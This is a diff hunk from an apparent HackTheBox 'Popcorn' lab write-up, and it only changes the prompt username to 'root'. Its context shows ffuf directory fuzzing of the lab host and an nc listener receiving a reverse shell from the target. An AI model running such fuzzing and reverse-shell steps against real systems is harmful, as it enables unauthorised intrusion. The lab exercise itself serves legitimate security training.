@@ -71,7 +71,7 @@ Nmap done: 1 IP address (1 host up) scanned in 0.57 seconds
 Okay  let's dirbust the port80.
 
 ```bash
-argenestel@parrot  ~/Desktop/hackthebox/popcorn  ffuf -w /usr/share/wordlists/dirb/big.txt -u http://10.10.10.6/FUZZ  
+root@parrot  ~/Desktop/hackthebox/popcorn  ffuf -w /usr/share/wordlists/dirb/big.txt -u http://10.10.10.6/FUZZ  
 
        /'___\  /'___\           /'___\        
       /\ \__/ /\ \__/  __  __  /\ \__/        
@@ -130,7 +130,7 @@ Alright done now lets manupulate screenshot.
 Hurrayy let's get shell
 
 ```bash
-argenestel@parrot  ~/Desktop/hackthebox/popcorn  nc -lvnp  4444  
+root@parrot  ~/Desktop/hackthebox/popcorn  nc -lvnp  4444  
 listening on [any] 4444 ...
 connect to [10.10.14.10] from (UNKNOWN) [10.10.10.6] 48833
 Linux popcorn 2.6.31-14-generic-pae #48-Ubuntu SMP Fri Oct 16 15:22:42 UTC 2009 i686 GNU/Linux
